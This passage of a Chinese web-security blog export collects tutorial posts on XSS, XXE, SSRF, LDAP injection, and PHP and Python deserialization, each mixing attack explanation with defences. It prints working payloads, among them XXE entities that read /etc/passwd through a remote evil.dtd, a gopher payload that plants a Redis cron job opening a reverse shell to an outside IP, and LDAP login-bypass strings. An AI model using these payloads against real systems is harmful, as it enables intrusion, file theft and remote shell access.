    <content type="text"><![CDATA[0x01 HTML标签之间例如输出点：1&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt; 直接提交1&lt;script&gt;alert(1)&lt;/script&gt; 即可触发XSS，但是当标签是不能执行脚本的标签 总结那么就得先把那个标签闭合，然后在注入XSS语句，例如1&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x02 HTML标签之内例如输入点：1&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt; 两种方法： 闭合属性，然后用on时间来触发脚本 1&quot; onmouseover=alert(1) x=&quot; 闭合属性后闭合标签，然后直接执行脚本 1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 还有一些特殊的场景：1&lt;input type=&quot;hiden&quot; value=&quot;[输出]&quot; /&gt; 这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本1&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt; 但是这里可以输入11&quot; onmouseover=alert(1) type=&quot;text 输出变为1&lt;input value=&quot;1&quot; onmouseover=alert(1) type=&quot;text&quot; type=&quot;hidden&quot; /&gt; 这时候的输出就不再是隐藏表单了，而是标准输入框 再比如这两类场景： 输出在src/href/action等属性内，比如1&lt;a href=&quot;[输出]&quot;&gt;click me &lt;/a&gt; 除了各种闭合标签外，还可以12javascript:alert(1)//data:text/html;base64,(base64字符串) 前提是我们提交的payload必须出现在这些属性值的开头部分（data:协议的必须作为整个属性值出现，IE不支持） 对于javascript:alert(1)//来说，如果网站把注释符//过滤了，那么我们还可以用javascript逻辑与算数运算符，因为JavaScript是弱类型语言，字符串与字符串之间的各种运算是合法的，可以用12&lt;a href=&quot;javascript:alert(1) - html&quot;&gt;click me&lt;/a&gt;window.onerror=function()&#123;return true;&#125; //抑制错误 输出在on*事件内，比如1&lt;a href=&quot;#&quot; onclick=&quot;[输出]&quot;&gt;click me&lt;/a&gt; on*事件是可以执行javascript脚本的。 0x03 成为Javascript代码的值例如1&lt;script&gt;a=&quot;[输出]&quot;;...&lt;/script&gt; 此时我们可以闭合标签1&lt;/script&gt;&lt;script&gt;alert(1)// 也可以闭合a变量的值1&quot;;alert(1);// 0x04 成为CSS代码的值打开就是利用expression关键词来执行脚本]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-安全脉搏漏洞挖掘小记]]></title>
    <url>%2F2018%2F05%2F30%2F%E8%BD%AC%E8%BD%BD-%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x01 前言 以前没有漏洞挖掘实践的经验，最近XMAN要求进行漏洞挖掘，所以遇到漏洞挖掘笔记还是要记录一下滴…没转载过，直接放链接好了http://byd.dropsec.xyz/2017/08/07/%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/#more]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞攻击与防御]]></title>
    <url>%2F2018%2F05%2F30%2FXXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 XML基础在聊XXE之前，先说说相关的XML知识吧。 定义XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTDXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。内部声明DTD:1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD中的一些重要的关键字： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体类别介绍实体主要分为一下四类 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 举例：内部实体1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 外部实体1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体123&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;或者&lt;!ENTITY % 实体名称 &quot;URI&quot;&gt; 注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。 外部实体默认协议 PHP扩展协议 举例：12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt; 0x02 XXE漏洞XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 举例 恶意引入外部实体(1) 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;a&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/a&gt; 恶意引入外部实体(2) 1234567**XML内容**&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %d;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 恶意引入外部实体(3) XML文件内容12345&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt; DTD文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; XXE的危害 读取任意文件- 有回显 XML.php1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 访问XML.php可以读取etc/passwd文件内容 - 无回显 当页面没有回显的话，可以将文件内容发送到远程服务器，然后读取。12345678&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % f SYSTEM &quot;http://www.m03.com/evil.dtd&quot;&gt; %f;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt;$data = simplexml_load_string($xml);print_r($data); 远程服务器的evil.dtd文件内容1&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 命令执行 php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。1234567891011&lt;?php $xml = &lt;&lt;&lt;EOF&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt; 内网探测/SSRF 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 0x03 XXE漏洞修复与防御 使用开发语言提供的禁用外部实体的方法PHP1libxml_disable_entity_loader(true); JAVA12DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python12from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 ##0x04 遗留问题(已解决) 以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。（2017.9.20更新）今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。 ##0x05 参考文献 https://security.tencent.com/index.php/blog/msg/69http://php.yjsweb.cn/php/68075544811183197241.htmlhttps://thief.one/2017/06/20/1/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XXE</tag>
        <tag>XML注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞攻击与防御]]></title>
    <url>%2F2018%2F05%2F30%2FSSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 概述SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 0x02 SSRF的危害 扫内网 向内部任意主机的任意端口发送精心构造的Payload DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等） 利用file协议读取本地文件等 0x03 漏洞利用CURL支持协议 本地利用 123456789# dict protocol (操作Redis)curl -vvv &apos;dict://127.0.0.1:6379/info&apos;# file protocol (任意文件读取)curl -vvv &apos;file:///etc/passwd&apos;# gopher protocol (一键反弹Bash)# * 注意: 链接使用单引号，避免$变量问题curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos; 远程利用 漏洞代码testssrf.php（未作任何SSRF防御）1234567891011&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); &#125;$url = $_GET[&apos;url&apos;];curl($url);?&gt; 利用file协议读取文件 利用dict协议查看端口开放当端口开放的时候 当端口未开放的时候 回显 利用gopher协议反弹shell 待更新。。。 漏洞代码testssrf2.php限制了只能使用HTTP,HTTPS，设置跳转重定向为True（默认不跳转）12345678910111213141516&lt;?php function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);//限制为HTTP,HTTPS curl_setopt($ch,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($url); curl_close();&#125;$url = $_GET[&apos;url&apos;];curl($url); ?&gt; 此时用file、dict等协议就没有用了。此时可以利用302跳转进行利用1234567891011&lt;?php$schema = $_GET[&apos;s&apos;];$ip = $_GET[&apos;i&apos;];$port = $_GET[&apos;p&apos;];$query = $_GET[&apos;q&apos;];if(empty($port))&#123; header(&quot;Location: $schema://$ip/$query&quot;);&#125;else&#123; header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;?&gt; 0x04 漏洞代码curl造成的SSRF12345678910function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;$url = $_GET[&apos;url&apos;];curl($url); file_get_contents造成的SSRF12$url = $_GET[&apos;url&apos;];echo file_get_contents($url); fsockopen造成的SSRF12345678910111213141516171819&lt;?phpfunction Getfile($host, $port, $link)&#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if(!$fp)&#123; echo &quot;$errstr (error number $errno) \n&quot;; &#125;else&#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;HOST $host \r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $content = &apos;&apos;; while(!feof($fp))&#123; $contents .= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125;&#125; 0x05 常见的过滤与绕过常见的过滤 过滤开头不是http://xxx.com的所有链接 过滤格式为ip的链接，比如127.0.0.1 结尾必须是某个后缀 绕过方法 http基础认证http://xxx.com@attacker.com 利用302跳转（xip.io，www.tinyrul.com）2.1 当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.12.2 如果利用上面的方法会被检测127.0.0.1的话，可以利用www.tinyurl.com提供的服务来进行绕过 加上#或?即可 4.更改其他进制的ip 0x06 修复方案修复方案： • 限制协议为HTTP、HTTPS • 不用限制302重定向 • 设置URL白名单或者限制内网IP]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDAP注入漏洞与防御]]></title>
    <url>%2F2018%2F05%2F30%2FLDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 前言前两天爆了一个LDAP漏洞，据说存在了8年现在才被发现，感概一下，不知这8年来有多少站被搞了。。。想着复现这个漏洞，就先复习一下LDAP注入的相关知识吧，差了很多资料，记一下笔记。 0x02 LDAP介绍在学习LDAP注入之前，首先要了解LDAP的运行机制。什么是LDAP？LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说，可以理解为LDAP是某种搜索协议，就像我们熟知的数据库一样，我们利用SQL语句进行查询数据库中的数据。而LDAP也有一套自己的查询语句，来进行查询。 LDAP查询语法12search语法：attribute operator valuesearch filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter)) LDAP的搜索语法其实很容易，这里看不明白的话，往下看一下具体实例就会明白的。 0x03 LDAP注入攻击轻量级目录访问协议是通过TCP/IP查询和修改目录服务的协议，使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP。 1(&amp;(attribute=value)(injected_filter)) (second_filter) 需要注意的是，在OpenLDAP中，第二个过滤器会被忽略，只有第一个会被执行，那么类似上面的这种注入就可以成功的。而在ADAM中，有两个过滤器的查询是不被允许的，那么这种注入是没什么用的。 AND LDAP注入 当后端的代码如下1(&amp;(parameter1=value1)(parameter2=value2)) 这里value1和value2都会被查询，其中value1和value2是用户可控的，如果过滤不完善，就会存在LDAP注入的可能。比如一个用户登录的场景，用户输入username和password，应用会构造一个过滤器并发给LDAP服务器进行查询。1(&amp;(username=uname)(password=pwd)) 当用户输入一个有效的用户名，例如admin，那么就有可能在username字段后面进行注入，从而在不知道密码的情况下进行登陆。12payload: admin)(&amp;))result: (&amp;(username=admin)(&amp;))(password=123)) LDAP服务器只会处理第一个过滤器，而第一个过滤器永真，因此绕过了登录框 OR LDAP注入 当后端代码如下：1(|(parameter1=value1)(parameter2=value2)) 一个典型的OR LDAP注入的场景就是：假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。用于展示可用资源的查询为：1(|(type=Rsc1)(type=Rsc2)) Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。12payload: Rsc1=printer)(uid=*)result: (|(type=printer)(uid=*))(type=scanner)) LDAP服务器会响应所有的打印机和用户对象 LDAP盲注- LDAP AND盲注 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：1(&amp;(objectclass=printer)(type=Epson*)) 使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击”)(objectClass=))(&amp;(objectClass=void”，Web应用会构造如下查询：1(&amp;(objectclass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*)) 仅对第一个过滤器进行处理：1(&amp;(objectclass=*)(objectClass=*)) 结果是，打印机的图标会一定显示出来，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。例如构造如下的注入：123(&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*)) 这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。 - LDAP OR盲注 这种情况下，用于推测想要的信息的逻辑是相反的，因为使用的是OR逻辑操作符。接下来使用的是同一个例子，OR环境的注入为：1(|(objectClass=void)(objectClass=void))(&amp;(objectClass=void)(type=Epson*)) 这个LDAP查询没有从LDAP目录服务获得任何对象，打印机的图标也不会显示给客户端(FALSE)。如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息：12(|(objectClass=void)(objectClass=users))(&amp;(objectClass=void)(type=Epson*))(|(objectClass=void)(objectClass=resources))(&amp;(objectClass=void)(type=Epson*)) ##0x04 LDAP注入防御 LDAP注入的防御跟SQL注入的防御其实差不多，主要就是要把用户输入的东西过滤好，基本就可以防御了。下图包含了LDAP中用到的特殊字符和需要转义处理的字符： 左边的字符在正常情况下是不会用到的，如果在用户的输入中出现了需要用反斜杠转义处理。而右边的圆括号这些如果不过滤的话就会导致过滤器闭合而生产攻击者需要的filter，这里看到不仅是用反斜杠处理，还将字符变成了相应的ASCII码值，这些符号本不该出现。 这段php防御代码可以记录一下：123456789function ldapspecialchars($string) &#123; $sanitized=array(&apos;\\&apos; =&gt; &apos;\5c&apos;, &apos;*&apos; =&gt; &apos;\2a&apos;, &apos;(&apos; =&gt; &apos;\28&apos;, &apos;)&apos; =&gt; &apos;\29&apos;, &quot;\x00&quot; =&gt; &apos;\00&apos;); return str_replace(array_keys($sanitized),array_values($sanitized),$string);&#125; LDAP服务开启的端口是389，如果发现某个服务器上开启了该端口很可能就是开启了LDAP服务 0x05 参考文献http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>LDAP注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞与防御]]></title>
    <url>%2F2018%2F05%2F30%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x01 概述什么是php反序列化漏洞呢？简单的来说，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过unserialize()函数进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。在了解php反序列化漏洞之前，需要了解一下php序列化和反序列化的相关知识。 0x02 PHP序列化与反序列化123456789101112&lt;?phpclass Test&#123; public $var = &quot;This is a test&quot;; public function PrintVar()&#123; echo this -&gt; $var; &#125;&#125;$obj = new Test();$obj-&gt;PrintVar();?&gt; 运行后 magic 函数 php面向对象变成中，有一类函数叫做magic function，魔术函数，这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里说一下比较常见的例如construct，destory， sleep，wakeup，toString函数。 __construct() __contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数 __destruct() __destruct()函数被称为析构函数，当类结束的时候自动调用该函数 __sleep() __sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 __wakeup() __wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数 __toString() __toString()函数是当对象被当做字符串的时候会自动调用该函数 例如： 运行后结果： 私有成员与被保护成员变量的特殊性当类中的成员变量是私有的或者被保护的，那么会产生一些特殊的情况 运行结果： 我们可以看到，在序列化后得到的序列化代码中，私有成员变量name前加了一个User，被保护变量成员age的前面加了一个，并且明明Username长度为8，但是却显示的是10；同样，明明age的长度为4，但却显示的是6。查阅php手册发现，当成员变量是私有的时候，会在成员变量前面添加类名；当成员变量是被保护的时候，会在被保护成员前面添加一个，并且，所添加的类名或者的左右两边都会有一个null字节，因此，这两个长度都增加了2。 ##0x03 PHP反序列化漏洞 wakeup()或destruct()的利用场景 假设服务器的代码如下：123456789101112131415161718&lt;?php class Test&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $fp = fopen(&quot;test.php&quot;, &apos;w&apos;); fwrite($fp, $this -&gt; test); fclose($fp); &#125;&#125;$test1 = $_GET[&apos;test&apos;];print_r($test1);echo &quot;&lt;br /&gt;&quot;;$seri = unserialize($test1);require &quot;test.php&quot;;?&gt; 我们可以在本地搭建环境，编写exp之后用serialize函数进行序列化，得到payload，如：1O:4:&quot;Test&quot;:1:&#123;s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;&#125; 其他Magic Function情况 当unserialize的时候不是直接在wakup魔术方法中利用，比如在construct之类的，也是有利用价值的。譬如，当wakup中又调用了别的对象，那么我们就可以进行回溯去找，也许也可以利用到。例如：123456789101112131415161718192021&lt;?php class Test1&#123; function __construct($test)&#123; $fp = fopen(&quot;shell.php&quot;, &quot;w&quot;); fwrite($fp, $test); fclose($fp); &#125;&#125;class Test2&#123; var $test = &quot;123&quot;; function __wakeup()&#123; $obj = new Test1($this -&gt; test); &#125;&#125;$test = $_GET[&apos;test&apos;];unserialize($test);require &quot;shell.php&quot;;?&gt; 普通情况 当危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时可以寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728&lt;?php class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test2(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test2&#123; function action()&#123; echo &quot;Test2&quot;; &#125;&#125;class Test3&#123; var $test3; function action()&#123; eval($this-&gt;test3); &#125;&#125;$test = new Test1();unserialize($_GET[&apos;test&apos;]);?&gt; 这里我们可以利用Test3中的action函数中的eval函数做一些事情。12345678910111213141516class Test1&#123; var $test1; function __construct()&#123; $this-&gt;test1 = new Test3(); &#125; function __destruct()&#123; $this-&gt;test1-&gt;action(); &#125;&#125;class Test3&#123; var $test3 = &quot;phpinfo();&quot;;&#125;echo serialize(new Test1()); 得到 O:5:”Test1”:1:{s:5:”test1”;O:5:”Test3”:1:{s:5:”test3”;s:10:”phpinfo();”;}} ##0x04 参考文献 https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python反序列化之pickle篇]]></title>
    <url>%2F2018%2F05%2F30%2FPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpickle%E7%AF%87%2F</url>
    <content type="text"><![CDATA[0x01 前言前两天在安全客中看了一篇python对象注入的文章，感觉写的很好，就学习一下，在此记录一下。 0x02 Python之pickle在研究python反序列化漏洞之前，我们需要了解本次研究的主体：pickle模块这里主要需要知道4个方法：dump()dumps()load()loads() pickle.dump(obj, file, [protocol])dump()会将对象序列化后写入一个文件中，其中，文件需要有write接口，protocol代表的是协议，当protocol=0的时候表示序列化对象用可表示的ascii码写，当protocol=1的时候代表用二进制表示，那么文件就要用wb模式打开，当protocol=2的时候也是用二进制表示，在python2.3之后的版本可以使用，会更高效一些，默认protocol=0。 pickle.dumps(obj)与dump()不同的是，dumps()只是将序列化对象当作字符串返回 pickle.load(file)load()会读入file的内容，并将其反序列化为对象，file的内容要求是序列化的内容。 pickle.loads(pick_data)loads()会将序列化的字符串反序列化为对象 cPickle与pickle的用法差不多，但是cPickle使用C语言写的，别pickle更高效，现在大部分都会使用cPickle来代替pickle了。 0x03 Python对象注入之pickle什么是对象注入？回想一下之前讲PHP反序列化漏洞的时候的概念，其实差不多，在pickle中，序列化的过程是没有问题的，但是当反序列化的过程中，如果用户的输入被传入unpickling中时，那么就有可能存在对象注入的风险。 举个例子：12345678910111213141516171819202122232425import cPickle as pickleimport os, sysarg = sys.argv[1]class Test(object): def load(self, filenmae=None): with open(filenmae, &apos;rb&apos;) as pick_file: self.doWork = pickle.load(pick_file) self.workDone = self.doWork def final_workout(self, unpickled_data): self.filename = &quot;code.py&quot; self.writeinto = open(self.filename, &quot;w&quot;) self.writeinto.write(unpickled_data) print &quot;Flag = 1&quot; self.writeinto.close() os.system(&quot;python2 &#123;&#125;&quot;.format(str(self.filename)))if __name__ == &apos;__main__&apos;: test = Test() test.load(arg) unpickled_data = test.workDone test.final_workout(unpickled_data) 这段代码中，首先他有一个接受用户输入的功能，并且反序列化了用户的输入，并放入一个叫做code.py脚本中执行，那么我们就可以构造特定的字符串来执行我们想要的功能。 0x04 漏洞利用编写exp.py1234567891011121314151617181920212223242526272829303132333435import cPickle as picklefilename = &quot;pickle_data2.txt&quot;code = &quot;code.txt&quot;class Test(object): def load(self, code): self.code = code self.readin = open(code, &quot;r&quot;) self.readin_data = self.readin.read() self.done = pickle.dumps(self.readin_data) def write_into(self, filename, pickle_data): self.writeinto =open(filename, &quot;w&quot;) self.writeinto.write(pickle_data) print &quot;Writing pickle data into the file...&quot; self.writeinto.close() def read_into(self, filenmae): self.filename = filename self.readinto = open(filename, &quot;r&quot;) self.ret_data = self.readinto.read() print &quot;\n\n&quot; print &quot;Pickle data: \n\n&quot; print self.readin_dataif __name__ == &apos;__main__&apos;: test = Test() test.load(code) pickle_data = test.done test.write_into(filename, pickle_data) test.read_into(filename)]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Web安全</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中的接口]]></title>
    <url>%2F2018%2F05%2F30%2FJava%E4%B8%AD%E7%9A%84%E6%8E%A5%E5%8F%A3%2F</url>
